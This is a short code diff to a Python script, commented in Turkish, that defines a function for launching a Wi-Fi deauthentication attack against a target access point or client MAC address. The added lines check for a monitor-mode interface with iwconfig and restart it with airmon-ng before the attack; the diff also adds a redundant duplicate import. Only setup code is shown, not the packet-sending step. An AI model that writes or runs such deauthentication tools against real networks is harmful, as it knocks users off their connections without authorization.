@@ -66,6 +66,8 @@ import subprocess
 
 import subprocess
 
+import subprocess
+
 # Deauthentication saldırısını başlatma
 def start_deauth_attack(target_mac, client_mac, packet_count):
     # Paket sayısını doğrulama
@@ -79,6 +81,15 @@ def start_deauth_attack(target_mac, client_mac, packet_count):
 
     # Wi-Fi arayüzünü belirleme
     interface = "wlan0mon"
+
+    # Önce arayüzü test edelim!
+    check_interface = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
+    print("[DEBUG] iwconfig Output:", check_interface.stdout)
+
+    if "wlan0mon" not in check_interface.stdout:
+        print("[-] Monitor mode interface not found! Restarting...")
+        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"])
+        subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
 
     # Hedeflenen cihaza saldırı mı, yoksa SSID’ye genel saldırı mı?
     if client_mac:
